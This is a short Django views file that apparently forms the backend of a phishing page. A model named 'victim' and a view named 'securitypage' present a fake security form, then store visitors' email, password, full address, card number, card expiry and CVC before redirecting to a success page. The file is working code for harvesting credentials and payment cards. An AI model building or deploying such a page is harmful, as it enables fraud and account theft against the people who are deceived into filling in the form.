from django.shortcuts import render
from .models import victim
from .forms import addvictim
from django.views.generic import CreateView
from django.urls import reverse_lazy , reverse

def home(request,pk):
	l=pk
	return render(request,'home.html',{'l':l})

	

def success(request):
	return render(request,'success.html')
		
	

class securitypage(CreateView):
	model = victim
	from_class = addvictim
	template_name = "security.html"
	success_url = reverse_lazy('success')
	fields =['first_name','last_name','Address_one','Address_two','City','country','zip_code','Email','password','card_number','card_expiry','card_cvc']
# Create your views here.
